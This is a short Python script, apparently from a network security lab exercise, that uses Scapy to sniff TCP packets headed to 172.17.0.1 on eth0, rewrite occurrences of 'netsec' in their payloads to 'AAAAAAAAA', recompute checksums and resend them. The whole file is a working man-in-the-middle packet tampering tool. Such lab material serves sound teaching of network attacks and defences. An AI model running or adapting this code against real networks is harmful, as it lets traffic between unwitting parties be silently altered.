from scapy.all import *

def spoof_pkt(pkt):

    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** %s, len=%d" % (data, len(data)))

        newdata = data.replace(b'netsec', b'AAAAAAAAA')

        print(newdata)

        send(newpkt/newdata)

    else:
        send(newpkt)

f = 'ip and dst 172.17.0.1'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt, count=10)

